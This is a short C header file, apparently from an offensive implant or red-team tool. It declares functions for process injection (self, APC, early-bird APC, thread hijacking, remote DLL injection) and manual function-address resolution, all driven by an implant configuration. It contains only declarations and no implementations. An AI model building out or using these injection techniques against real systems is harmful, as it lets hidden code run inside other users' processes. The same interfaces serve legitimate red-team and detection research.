#pragma once

#include "../include/config.h"

VOID inject_self(IMPLANT_CONFIG config);
VOID apc_inject(IMPLANT_CONFIG config);
VOID early_apc_inject(IMPLANT_CONFIG config);
PVOID manual_procaddress(HMODULE mod_handle, const char* funcName);
VOID thread_hijack(IMPLANT_CONFIG config);

#ifdef __cplusplus
extern "C" {
#endif
	void remote_inject(DWORD pid, wchar_t* dllPath);
#ifdef __cplusplus
}
#endif